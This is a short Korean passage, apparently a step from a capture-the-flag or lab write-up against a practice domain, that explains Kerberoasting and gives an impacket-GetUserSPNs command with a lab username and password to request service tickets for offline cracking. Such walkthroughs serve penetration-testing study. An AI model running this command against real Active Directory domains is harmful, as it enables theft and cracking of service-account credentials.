
- **목적:** 서비스 주체 이름(SPN)이 등록된 계정을 찾아 서비스 티켓을 요청하고, 이를 오프라인에서 크랙하여 계정의 비밀번호를 알아냅니다.
- ---

```bash
impacket-GetUserSPNs -dc-ip $target 'vulnnet-rst.local/t-skid:tj072889*' -request
```


